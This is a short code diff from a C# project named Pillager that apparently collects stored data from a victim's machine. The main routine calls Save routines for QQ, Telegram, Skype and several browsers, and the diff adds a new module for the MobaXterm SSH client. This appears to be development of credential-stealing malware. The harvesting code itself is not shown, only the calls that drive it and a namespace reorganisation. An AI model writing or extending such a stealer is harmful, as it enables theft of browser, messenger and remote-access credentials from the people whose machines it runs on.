@@ -3,7 +3,8 @@ using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
 using Pillager.Browsers;
-using Pillager.IM;
+using Pillager.Messengers;
+using Pillager.Tools;
 
 namespace Pillager
 {
@@ -17,12 +18,15 @@ namespace Pillager
             if (File.Exists(savezippath)) File.Delete(savezippath);
             Directory.CreateDirectory(savepath);
 
-            //IM
+            //Tools
+            MobaXterm.Save(savepath);
+
+            //Messengers
             QQ.Save(savepath);
             Telegram.Save(savepath);
             Skype.Save(savepath);
 
-            //Browser
+            //Browsers
             IE.Save(savepath);
             OldSogou.Save(savepath);//SogouExplorer < 12.x
             FireFox.Save(savepath);
